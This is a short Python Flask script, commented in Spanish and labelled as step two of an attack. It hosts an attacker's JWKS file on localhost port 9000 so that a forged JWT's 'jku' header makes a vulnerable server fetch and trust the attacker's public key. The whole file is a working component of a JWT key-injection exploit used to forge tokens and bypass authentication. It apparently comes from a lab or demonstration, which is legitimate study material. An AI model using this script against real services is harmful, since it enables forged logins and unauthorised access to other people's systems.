"""
Paso 2 del ataque: hostear el JWKS del atacante.

Sirve  jwks.json  en  http://localhost:9000/jwks.json  . Esa es la URL que
va a ir en el header `jku` del token forjado, y la que el servidor
vulnerable va a consultar para traerse la clave publica del atacante.
"""
import os

from flask import Flask, send_from_directory

AQUI = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)


@app.route("/jwks.json")
def jwks():
    return send_from_directory(AQUI, "jwks.json", mimetype="application/json")


if __name__ == "__main__":
    print("=" * 60)
    print(" JWKS del atacante en  http://localhost:9000/jwks.json")
    print("=" * 60)
    app.run(host="0.0.0.0", port=9000)
